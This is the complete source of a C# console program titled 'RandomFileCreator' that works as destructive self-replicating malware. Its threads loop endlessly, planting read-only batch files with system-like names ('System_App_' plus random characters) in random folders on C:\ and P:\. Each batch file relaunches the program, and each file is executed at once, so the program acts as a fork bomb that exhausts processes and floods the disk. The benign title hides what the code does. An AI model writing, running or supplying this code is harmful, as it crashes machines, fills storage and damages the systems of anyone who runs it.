using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace RandomFileCreator
{
    class Program
    {
        public static Random random = new Random();
        public const int threads = 4;
        public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;

        static void Main(string[] args)
        {
            if (Directory.Exists("P:\\"))
            {
                RunThreads(threads, "P:\\");
            }
            else
            {
                RunThreads(threads / 2, "c:\\");
            }
            RunThreads(threads / 2 + threads % 2, "c:\\");
        }

        public static void RunThreads(int threads, string path)
        {
            Thread[] thrs = new Thread[threads];
            for (int i = 0; i < threads; i++)
            {
                thrs[i] = new Thread(Run);
                thrs[i].Start(path);
            }
        }

        public static void Run(object path2)
        {
            try
            {
                while (true)
                {
                    string path;
                    path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
                    using (StreamWriter sw = new StreamWriter(path, true))
                    {
                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
                        sw.Write("dotnet " + appPath);
                    }
                    Process.Start(path);
                }
            }
            catch (Exception)
            {
                Run((string)path2);
                return;
            }
        }
        public static string RandomPath(string path)
        {
            try
            {
                string[] names = Directory.GetDirectories(path);
                if (names.Length == 0 || random.Next(0, 2) == 0)
                {
                    return path;
                }
                int rand = random.Next(0, names.Length - 1);
                return RandomPath(names[rand]);
            }
            catch (UnauthorizedAccessException)
            {
                return path;
            }
        }
        public static string RandomName(string str = "")
        {
            if (str.Length == 18)
            {
                return str;
            }
            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
            return RandomName(str + ((char)rand));
        }

    }
}